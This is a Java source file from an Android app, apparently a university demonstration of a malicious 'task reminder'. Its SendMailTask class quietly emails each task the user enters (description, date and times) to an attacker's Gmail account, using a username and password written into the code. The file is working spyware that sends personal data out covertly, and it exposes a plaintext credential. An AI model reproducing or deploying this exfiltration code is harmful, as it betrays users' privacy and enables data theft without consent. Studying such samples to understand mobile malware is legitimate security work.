package edu.cmu.malicioustaskreminder;

import android.os.AsyncTask;
import android.util.Log;

public class SendMailTask extends AsyncTask<TaskDetails, Void, Void> {

	@Override
	protected Void doInBackground(TaskDetails... tasks) {
		try {   
			TaskDetails task = tasks[0];
            MaliciousGmailSender sender = new MaliciousGmailSender("malicousattacker@gmail.com", "Qwertyuiop123");
            sender.sendMail("Greetings supreme master!!",   
                    "Your unfortunate minion has added the following task:\n\n\t "+ "Details: "+task.getDescription()
                    +"\n\t Date: " + task.getDateString() + "\n\t Start Time: " + task.getFromTimeString() +
                    "\n\t End Time: " + task.getToTimeString(),   
                    "malicousattacker@gmail.com",   
                    "ramya201@gmail.com");   
        } catch (Exception e) {   
            Log.e("SendMail", e.getMessage(), e);   
        } 
		return (Void)null;
		
	}

}
